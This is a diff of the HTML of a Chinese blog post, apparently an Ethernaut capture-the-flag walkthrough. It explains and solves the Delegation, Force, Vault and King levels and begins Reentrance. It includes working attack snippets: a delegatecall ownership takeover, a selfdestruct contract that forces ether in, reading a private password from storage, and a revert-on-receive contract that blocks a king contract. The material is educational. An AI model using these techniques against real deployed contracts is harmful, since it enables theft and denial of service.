-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line">contract Calltest &#123;</span><br><span class="line">    address public b;</span><br><span class="line"></span><br><span class="line">    function test() public &#123;</span><br><span class="line">        b=address(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Compare &#123;</span><br><span class="line">    address public b;</span><br><span class="line">    address public testaddress;</span><br><span class="line"></span><br><span class="line">    event logb(address _a);</span><br><span class="line"></span><br><span class="line">    constructor(address _addressOfCalltest) public &#123;</span><br><span class="line">        testaddress = _addressOfCalltest;</span><br><span class="line">    &#125;</span><br><span class="line">    function withcall() public &#123;//通过call方法调用函数</span><br><span class="line">        testaddress.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        emit logb(b);</span><br><span class="line">    &#125;</span><br><span class="line">    function withdelegatecall() public &#123;//通过delegatecall方法调用函数</span><br><span class="line">        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        emit logb(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.23</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">Calltest</span> <span class="token punctuation">&#123;</span>
+    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+        b<span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">contract</span> <span class="token class-name">Compare</span> <span class="token punctuation">&#123;</span>
+    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>
+    <span class="token builtin">address</span> <span class="token keyword">public</span> testaddress<span class="token punctuation">;</span>
+
+    <span class="token keyword">event</span> <span class="token function">logb</span><span class="token punctuation">(</span><span class="token builtin">address</span> _a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _addressOfCalltest<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+        testaddress <span class="token operator">=</span> _addressOfCalltest<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">withcall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">//通过call方法调用函数</span>
+        testaddress<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">emit</span> <span class="token function">logb</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">withdelegatecall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">//通过delegatecall方法调用函数</span>
+        testaddress<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">emit</span> <span class="token function">logb</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222013360.png"></p>
 <p>图中可以看到，在使用call方法调用函数时，可以发现<code>CALLTEST</code>合约的b已经变成了这个合约的部署地址<code> 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53</code>，而Compare合约的地址并没有变化。说明<code>call</code>只是在<code>Calltest</code>合约中执行了test函数</p>
 <p>而在使用delegatecall方法调用函数时，<code>COMPARE</code>合约的b变成了合约部署地址，说明这个函数实际上是在<code>Compare</code>合约中执行的，也就相当于是把函数复制了一份到合约中执行</p>
 <p>那么在这个合约中我们只需要通过fallback执行delegatecall来进入Delegate合约中的pwn方法来执行替换owner</p>
 <p>而fallback函数的执行只需要sendTransaction方法，带上data即可执行pwn函数，方法的ID是4字节的sha3</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.sendTransaction(&#123;data:web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">contract.sendTransaction(&#123;data:web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>使用<code>delegatecall</code> 是很危险的, 而且历史上已经多次被用于进行 attack vector. 使用它, 你对合约相当于在说 “看这里, -其他合约- 或是 -其它库-, 来对我的状态为所欲为吧”. 代理对你合约的状态有完全的控制权. <code>delegatecall</code> 函数是一个很有用的功能, 但是也很危险, 所以使用的时候需要非常小心.</p>
@@ -567,12 +752,36 @@
 <li>阅读上方的帮助页面, “控制台之外” 部分</li>
 </ul>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Force</span> <span class="token punctuation">&#123;</span><span class="token comment">/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>想让合约余额大于0首先想到的就是直接转账了<code>contract.sendTransaction(instance,1)</code>，但是由于fallback重写导致我们的交易被回退，如图所示</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222059265.png"></p>
 <p>此时我们就需要用到另一个合约了，在<code>selfdestruct</code>函数中会将整个合约销毁并将合约余额强制给予指定地址并且忽略fallback函数，所以这里我们只需要在制作一个新合约，存入代币，销毁发送到题目合约即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.16;</span><br><span class="line">contract Test&#123;</span><br><span class="line">  address aim;</span><br><span class="line">  constructor (address t)&#123;</span><br><span class="line">    aim=t;</span><br><span class="line">  &#125;</span><br><span class="line">  function a() payable&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  function sd()&#123;</span><br><span class="line">    selfdestruct(aim);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>
+  <span class="token builtin">address</span> aim<span class="token punctuation">;</span>
+  <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token builtin">address</span> t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    aim<span class="token operator">=</span>t<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>
+    
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>aim<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>在solidity中, 如果一个合约要接受 ether, fallback 方法必须设置为 <code>payable</code>.</p>
@@ -581,17 +790,34 @@
 <h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><blockquote>
 <p>打开 vault 来通过这一关!</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Vault</span> <span class="token punctuation">&#123;</span>
+  <span class="token builtin">bool</span> <span class="token keyword">public</span> locked<span class="token punctuation">;</span>
+  <span class="token builtin">bytes32</span> <span class="token keyword">private</span> password<span class="token punctuation">;</span>
+
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    password <span class="token operator">=</span> _password<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">==</span> _password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>明显要拿password，但是private怎么拿呢？</p>
 <blockquote>
 <p>这涉及到一点：以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量，我们可以使用<code>web3.eth.getStorageAt</code>来读取合约行对应地址的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第一个参数时对应要读取的合约地址，第二个参数是要读取内容的索引位置(变量是第几个被定义的变量)，第三个参数如果被设置，那么就不会使用默认的block(被<a target="_blank" rel="noopener" href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-defaultblock">web3.eth.defaultBlock</a>设置的默认块)，而是使用用户自定义的块，这个参数可选项有<code>&quot;earliest&quot;</code>, <code>&quot;latest&quot;</code> 和 <code>&quot;pending&quot;</code>，第四个选项设置回调函数。</p>
 </blockquote>
 <p>所以我们直接读就好啦，password第二个被定义，我们直接读1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await web3.eth.getStorageAt(contract.address,1)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">await web3.eth.getStorageAt(contract.address,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后用password解锁就好啦～</p>
 <blockquote>
@@ -603,11 +829,44 @@
 <p>这么有趣的游戏, 你的目标是攻破他.</p>
 <p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span>
+
+  <span class="token builtin">address</span> <span class="token keyword">payable</span> king<span class="token punctuation">;</span>
+  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span>
+  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  
+    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    king<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> king<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>直接看receive，我们需要出价比原来的king高才能拿到控制权，并且题目中说了在提交实例是关卡会重新尝试夺回王权，也就是再给我们一个更大数额的eth，我们怎么才能防止他通过更高出价来夺走王位呢？</p>
 <p>我们只需要在另起一个合约，在合约中设置receive内容为revert函数，这样在我们的合约收到代币的时候就会触发回滚导致king重夺王位失败</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract AttackKing &#123;</span><br><span class="line">    constructor(address payable _victim) public payable &#123;</span><br><span class="line">        _victim.call.gas(1000000).value(0.01 ether)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">AttackKing</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _victim<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+        _victim<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">0.01</span> ether<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).</p>
@@ -625,7 +884,36 @@
 <li>查看上方帮助页面, “控制台之外” 部分</li>
 </ul>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span>
+  
+  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>
+  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>
+
+  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        _amount<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>注意这里使用了<code>call&#123;value:xx&#125;</code>的形式，<code>call</code>是<code>send</code>和<code>transfer</code>函数底层实现，也是用来转账的。与它们的区别在于，<a target="_blank" rel="noopener" href="https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/">参考链接</a></p>
@@ -641,7 +929,44 @@
 </blockquote>
 <p>审计合约代码，这个合约的作用类似于银行，donate存withdraw取，那么这个代码问题究竟出在哪里呢，我们直接看存款函数，首先判断我们的账户是否有足够余额，然后给我们的账户转帐，最后扣除余额，看起来都没什么问题，但是如果银行的存款账户并不是一个钱包而是一个合约呢？</p>
